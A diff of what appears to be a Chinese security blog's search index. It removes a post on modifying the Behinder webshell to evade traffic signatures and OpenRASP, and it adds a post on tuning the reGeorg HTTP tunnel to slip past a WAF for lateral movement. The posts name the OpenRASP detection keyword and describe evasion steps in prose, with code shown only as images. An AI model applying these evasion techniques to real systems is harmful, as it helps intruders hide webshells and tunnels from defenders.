@@ -251,145 +251,6 @@ for c in ().__class__.__base__.__subclasses__():
       </tags>
   </entry>
   <entry>
-    <title>冰蝎，从入门到魔改（续）</title>
-    <url>/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本篇文章是<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f">《冰蝎，从入门到魔改》</a>的续篇。有小伙伴读过上一篇文章后联系笔者，说只介绍了 PHP 版本的特征擦除，希望可以获知其它语言版本的特征擦除思路和方法。本篇首先简单介绍一下上一篇文章中的通用流量特征点及擦除后的效果，再着重介绍在对”冰蝎”JSP 版和 ASP 版的魔改中碰到的问题及流量监测/规避的方法思路。</p>
-<h2 id="0x02-通用篇"><a href="#0x02-通用篇" class="headerlink" title="0x02 通用篇"></a>0x02 通用篇</h2><p>本章节简单的介绍一下 PHP、JSP、ASP 版本”冰蝎”的通用特征，具体原理和修改思路可以参考上一篇文章：<a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247485811&idx=1&sn=dfe68ca403b7009e2f41e622dd2b690f">《冰蝎，从入门到魔改》</a></p>
-<h3 id="密钥交换时的URL参数"><a href="#密钥交换时的URL参数" class="headerlink" title="密钥交换时的URL参数"></a>密钥交换时的URL参数</h3><p><strong>特征：</strong></p>
-<p>密钥交换式 Webshell 默认密码为 pass，并且参数值为 3 位随机数字。</p>
-<p><strong>原版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image1.png"></p>
-<p><strong>修改版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image2.png"></p>
-<h3 id="header中的Content-Type"><a href="#header中的Content-Type" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p><strong>特征：</strong></p>
-<p>GET 形式访问会携带 Content-type 字段，并且内容固定。</p>
-<p><strong>原版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image3.png"></p>
-<p><strong>修改版：</strong></p>
-<p>GET请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image4.png"></p>
-<p>POST请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image5.png"></p>
-<h3 id="header中的User-Agent"><a href="#header中的User-Agent" class="headerlink" title="header中的User-Agent"></a>header中的User-Agent</h3><p><strong>特征：</strong></p>
-<p>内置 17 个较旧 的User-Agent。</p>
-<p><strong>原版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image6.png"></p>
-<p><strong>修改版：</strong></p>
-<p>2020 年发布的 Firefox 75.0：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image7.png"></p>
-<p>2019 年 11 月发布的 Chrome 78.0.3904.108：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image8.png"></p>
-<h3 id="header中的Accept"><a href="#header中的Accept" class="headerlink" title="header中的Accept"></a>header中的Accept</h3><p><strong>特征：</strong></p>
-<p>Accept 字段为固定非常见值。</p>
-<p><strong>原版：</strong></p>
-<p>GET请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image9.png"></p>
-<p>POST请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image10.png"></p>
-<p><strong>修改版：</strong></p>
-<p>GET请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image11.png"></p>
-<p>POST请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image12.png"></p>
-<h3 id="二次密钥获取"><a href="#二次密钥获取" class="headerlink" title="二次密钥获取"></a>二次密钥获取</h3><p><strong>特征：</strong></p>
-<p>至少两次的 GET 形式获取密钥的过程。</p>
-<p><strong>原版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image13.png"></p>
-<p><strong>修改版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image14.png"></p>
-<h3 id="response中返回密钥"><a href="#response中返回密钥" class="headerlink" title="response中返回密钥"></a>response中返回密钥</h3><p><strong>特征：</strong></p>
-<p>密钥返回是直接以 16 位字符的形式返回到客户端，Content-Length 固定为 16。</p>
-<p><strong>原版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image15.png"></p>
-<p><strong>修改版：</strong></p>
-<p>直接访问：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image16.png"></p>
-<p>流量侧：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image17.png"></p>
-<h3 id="header中的Cookie"><a href="#header中的Cookie" class="headerlink" title="header中的Cookie"></a>header中的Cookie</h3><p><strong>特征：</strong></p>
-<p>Cookie 中携带非常规的 Path 参数内容。</p>
-<p><strong>原版：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image18.png"></p>
-<p><strong>修改后的效果：</strong></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image19.png"></p>
-<h2 id="0x03-JSP篇"><a href="#0x03-JSP篇" class="headerlink" title="0x03 JSP篇"></a>0x03 JSP篇</h2><h3 id="Webshell免杀原理"><a href="#Webshell免杀原理" class="headerlink" title="Webshell免杀原理"></a>Webshell免杀原理</h3><p>首先看下 JSP 版的 Webshell 代码，大体逻辑如下：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image20.png"></p>
-<p>可以看到将客户端发来的字节码转为类并实例化，之后调用了 equals 函数。 equals 函数默认为 Object 的函数，是比较两个对象的内存地址，在 JAVA 代码中非常常见的函数，所以整个 Webshell 看起来人畜无害。</p>
-<p>我们看下客户端中的相关代码，首先通过 getData 函数来获取发送的数据：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image21.png"></p>
-<p>getParamedClass 函数为将类转为字节码的关键函数：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image22.png"></p>
-<p>被转成字节码的 Cmd 类，其中 cmd 参数为执行命令的字符串：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image23.png"></p>
-<p>可以看到，Cmd 类中将 equals 函数重写了，内部中调用了 RunCMD 。而 RunCMD 实际就是使用 Runtime.getRuntime().exec 执行系统命令，并将输出返回。</p>
-<h3 id="header中的Content-Type-1"><a href="#header中的Content-Type-1" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p>JSP版本连接的时候，客户端的请求包中的 Content-Type 为 application/octet-stream ，意思是客户端传输的为字节流。如果未有此相关业务，可作为一个较明显的监测特征。</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image24.png"></p>
-<p><strong>修改思路：</strong></p>
-<p>POST形式访问时将值改为 Content-Type 值改为 “text/html; charset=utf-8” 或者 “text/x-www-form-urlencoded; charset=utf-8” 以规避安全检测。</p>
-<p>看Webshell中的代码是直接读取了一整行的数据，所以改成其它类型也是没关系的。</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image25.png"></p>
-<p><strong>修改后的效果：</strong></p>
-<p>POST请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image26.png"></p>
-<h3 id="对抗RASP"><a href="#对抗RASP" class="headerlink" title="对抗RASP"></a>对抗RASP</h3><p><strong>什么是RASP？</strong></p>
-<p>RASP 英文为 Runtime application self-protection，即实时应用自我保护。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序和应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遇到特定漏洞和攻击时不需要人工干预就可以进行自动重新配置应对新的攻击。</p>
-<p>此理念的众多产品，其中比较有名的开源项目叫做 OpenRASP 。 OpenRASP 是可以监测冰蝎后门的，不论 Webshell 如何免杀变形，OpenRASP 基于命令执行的调用堆栈来识别冰蝎：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image27.png"></p>
-<p>hah~ 这里提到了只要客户端代码不变，就可以检测到，但是我们既然是魔改就肯定会改代码的~</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image28.jpg"></p>
-<p>先来看下”冰蝎”连接 Webshell 后运行命令 whoami 的结果，在部署好 OpenRASP 后运行，可以在 tomcatroot/rasp/logs/alarm/alarm.log 文件中查到告警日志：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image29.png"></p>
-<p>我们可以看到，OpenRASP监测到了调用堆栈，冰蝎识别出了命令”cmd.exe /c whoami” 。</p>
-<p><strong>修改思路：</strong></p>
-<p>网上能查到的规避方案是修改包名，将 net.rebeyond.behinder 这三层包名修改或去掉。但是我们要知其然还要知其所以然。</p>
-<p>在更深入的了解 OpenRASP 的检测功能后我们发现，OpenRASP 的检测逻辑部分是由 JavaScript 语言实现的，原因是为了避免多平台上的重新实现。官方对此也有所说明：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image30.png"></p>
-<p>官方的检测逻辑在 <tomcatroot>/rasp/plugins/official.js 中，我们来查看这个文件并找出了检测调用堆栈的部分：</tomcatroot></p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image31.png"></p>
-<p>可以看到多种检测堆栈关键字的漏洞，如：fastjson 反序列化、ElasticSearch Groovy 的 RCE 等。在该文件第866行我们找到了”冰蝎”的检测关键字：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.rebeyond.behinder.payload.java.Cmd.RunCMD</span><br></pre></td></tr></table></figure>
-<p>关键字检测精确到了函数名 RunCMD。</p>
-<p>既然如此我们没有必要大张旗鼓地修改包名（还要修改调用资源的路径，非常麻烦），我们只需要修改 RunCMD 函数的名称就可以规避 OpenRASP 的检测。</p>
-<p><strong>修改后的效果：</strong></p>
-<p>我们修改好函数名后重新编译，并将服务器中的 alarm.log 告警日志清空后重启。</p>
-<p>客户端执行 whoami：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image32.png"></p>
-<p>服务端 OpenRASP 无法检测到该条命令执行，告警日志为空：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image33.png"></p>
-<h2 id="0x04-ASP篇"><a href="#0x04-ASP篇" class="headerlink" title="0x04 ASP篇"></a>0x04 ASP篇</h2><h3 id="魔改中的小坑"><a href="#魔改中的小坑" class="headerlink" title="魔改中的小坑"></a>魔改中的小坑</h3><p>在 ASP 版本的 Webshell 有个小坑。</p>
-<p>我们直接使用魔改之后的版本进行连接会报错：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image34.png"></p>
-<p>我们抓包看下：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image35.png"></p>
-<p>服务端返回状态码 500，服务器内部错误。</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image36.jpeg"></p>
-<p>其实这个坑点是在密钥交换的 GET 请求中，判断密码参数（默认为 pass 的字段）是否存在。</p>
-<p>代码如下:</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image37.png"></p>
-<p>在原版本中 pass 的值为随机 3 位数字，在 C# 语法中数字可以作为If判断的条件（0 为 False，其它数字为  True）。但是在我们的魔改版本中 pass 的值为了规避监测设置为了随机字符串。 C# 中字符串类型无法作为 If 的判断条件，会报类型不匹配的错误：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image38.png"></p>
-<p>我们需要将 Webshell 稍微改下，判断 pass 的值不为空字符串即可解决此问题。</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image39.png"></p>
-<p>运行结果：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image40.png"></p>
-<p>客户端连接：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image41.png"></p>
-<h3 id="header中的Content-Type-2"><a href="#header中的Content-Type-2" class="headerlink" title="header中的Content-Type"></a>header中的Content-Type</h3><p>ASP 版本的此问题跟 JSP 版本相同，都是在连接的时候，客户端的请求包中的 Content-Type 为 application/octet-stream ，可参考  JSP版本的修改思路。</p>
-<p><strong>修改后的效果：</strong></p>
-<p>POST请求：</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image42.png"></p>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>在笔者编写此篇文章之际，已经听闻到有”冰蝎”即将更新的消息。在这 HW 来临之际进行更新，可以预见到攻防两方都需要对此做好准备。祝各位参与 HW 的读者：HW 顺利 !</p>
-<p><img src="/2020/08/11/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9%EF%BC%88%E7%BB%AD%EF%BC%89/image43.jpeg"></p>
-<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
-      <categories>
-        <category>原创文章</category>
-      </categories>
-      <tags>
-        <tag>JAVA</tag>
-        <tag>安全工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>冰蝎，从入门到魔改</title>
     <url>/2020/08/09/%E5%86%B0%E8%9D%8E%EF%BC%8C%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E9%AD%94%E6%94%B9/</url>
     <content><![CDATA[<h2 id="0x01-什么是冰蝎？"><a href="#0x01-什么是冰蝎？" class="headerlink" title="0x01 什么是冰蝎？"></a>0x01 什么是冰蝎？</h2><p>“冰蝎”是一个动态二进制加密网站管理客户端。在实战中，第一代webshell管理工具”菜刀”的流量特征非常明显，很容易就被安全设备检测到。基于流量加密的webshell变得越来越多，”冰蝎”在此应运而生。</p>
@@ -551,6 +412,79 @@ for c in ().__class__.__base__.__subclasses__():
       </tags>
   </entry>
   <entry>
+    <title>reGeorg实战攻防</title>
+    <url>/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们已经通过各种操作getshell之后想要进行内网横向渗透，但因为目标ACL策略设置的比较严格，只允许HTTP协议和对应端口通过。我们无法通过使用端口转发或者是端口映射的方法来从外网访问到内网的其他机器。这时我们就会想到reGeorg这款工具，通过该工具代理进入内网，通过HTTP协议转发请求。</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image1.png"></p>
+<p>这个工具创建之初本意并不是专门用来渗透内网，而是某些企业员工在外网的环境下想访问内网资源。所以这几个安全意识不太足的小哥们写了一个可以通过部署在边界上的网页来进行流量转发，从而访问内网的一个办公工具……</p>
+<p>可以看到该工具的’斯搂梗’是说”每个办公室都需要这样的工具”..</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image2.jpeg"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>那么如此厉害的工具究竟是怎么实现的呢？我们一起来看下源码：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image3.png"></p>
+<p>从入口开始，就是标准的一套：LOGO + argparse 来进行参数的支持和解析，真正逻辑从askGeorg函数开始。这个函数是来测试远程代理服务器是否能够访问，我们来看下这个函数的具体内容：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image4.png"></p>
+<p>可以看到内容基本就是判断是否为HTTPS，然后使用哪个工具。用GET方法来请求，如果状态码为 200 且内容跟远程服务器中内容一样就认为是OK的。</p>
+<p>比较的内容就是浏览器访问看到的那一句话：</p>
+<p>Python中：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image5.png"></p>
+<p>php中：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image6.png"></p>
+<p>浏览器访问：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image7.png"></p>
+<p>我们来继续往下看：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image8.png"><br>监听了客户端的端口，并设置TCP的排队上限为1000，这样的对普通情况来说是足够了。</p>
+<p>后边是创建循环不停的接收报文，并且将接收到的传入 session 线程中并启动。</p>
+<p>session的构造比较简单：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image9.png"></p>
+<p>我们来看下线程最重要run中的内容：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image10.png"></p>
+<p>内容不多，就是判断Socks4还是5并解析，之后是创建读写线程并start</p>
+<p>判断Socks4 还是 5：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image11.png"></p>
+<p>Socks代理至少三个字节的请求,第一个字节一定为5，如果是Socks4，则第一个字节一定为4</p>
+<p>parseSocks5和parseSocks4 为判断对应Socks的协议解析是否成功。</p>
+<p>Reader：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image12.png"></p>
+<p>Writer：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image13.png"></p>
+<p>读写部分是一些转发的常规操作。</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image14.png"></p>
+<h2 id="实战攻防"><a href="#实战攻防" class="headerlink" title="实战攻防"></a>实战攻防</h2><p>在实战中使用可能会碰到一些特殊问题：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image15.png"></p>
+<p>比如在浏览器中访问可以出现熟悉的”Georg says，’All seems fine’”，说明可以正常访问。但是使用reGeorgSocksProxy客户端的时候会报’未准备好，请检查url’，这是为什么呢？</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image16.png"><br>排查问题需要进行一些代码调试：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image17.png"></p>
+<p>通过打印出的关键字搜索，可以看到是askGeorg这个函数返回了False 导致了退出程序。</p>
+<p>这时我们可以进行调试，使用Debug来跟进代码，一行一行看到底哪里出错了。当不具备调试环境时也可以使用打印的方法定位问题。</p>
+<p>这里我们使用打印的方法来定位问题：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image18.png"></p>
+<p>我们再尝试运行一下代码，看看哪里出错：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image19.png"></p>
+<p>可以看到返回的状态码为403，也就是说可能被WAF或者其他安全设备拦截掉了。我们通过代码可以获知只有当状态码为200的时候才可以正常使用，并且我们使用浏览器直接打开是可以正常访问的。也就是说我们的问题出现在了Python脚本跟浏览器的请求差异上，比如一些常见的请求头 User-Agent 、Accept-Language等，这些我们需要一一补上。</p>
+<p>我们需要将每一个请求都加入浏览器所包含的请求头，所以我们将该过程提取出来作为函数使用。</p>
+<p>修改后的代码：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image20.png"></p>
+<p>setupRemoteSession中的CONNECT：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image21.png"></p>
+<p>closeRemoteSession中的DISCONNECT:</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image22.png"></p>
+<p>reader中的READ:</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image23.png"></p>
+<p>Writer中的FORWORD:</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image24.png"><br>修改完代码后我们实际进行测试：</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image25.png"></p>
+<p>可以看到返回码已经变为200并且打印出了熟悉的’All seems fine’，说明可以正常使用了。Happy~</p>
+<p><img src="/2021/01/11/reGeorg%E5%AE%9E%E6%88%98%E6%94%BB%E9%98%B2/image26.jpeg"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>掌握调试/打印等方法不论是对代码审计和修改脚本都有很大的帮助和提升。我们在实战中会碰到各种各样的问题，这时候需要自己细心耐心以及编码修改能力来解决这些问题。这样我们才可以做到在这不断提升的攻防中稳步前行。</p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>内网工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>你不知道的Nmap之空闲扫描</title>
     <url>/2020/12/26/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84Nmap%E4%B9%8B%E7%A9%BA%E9%97%B2%E6%89%AB%E6%8F%8F/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在渗透测试的过程中，我们会经常会用到Nmap进行信息收集。但是Nmap存在一个缺点就是在进行探测过程中会向目标发送大量数据包，从而产生大量流量，这样极其容易引起目标警觉，甚至追踪到渗透测试者的真实IP地址。那我们该如何做才能做到既隐藏了自己的真实IP地址同时又能实现我们信息收集的任务呢？</p>
@@ -608,6 +542,201 @@ for c in ().__class__.__base__.__subclasses__():
       <tags>
         <tag>安全工具</tag>
         <tag>Nmap</tag>
+      </tags>
+  </entry>
+  <entry>
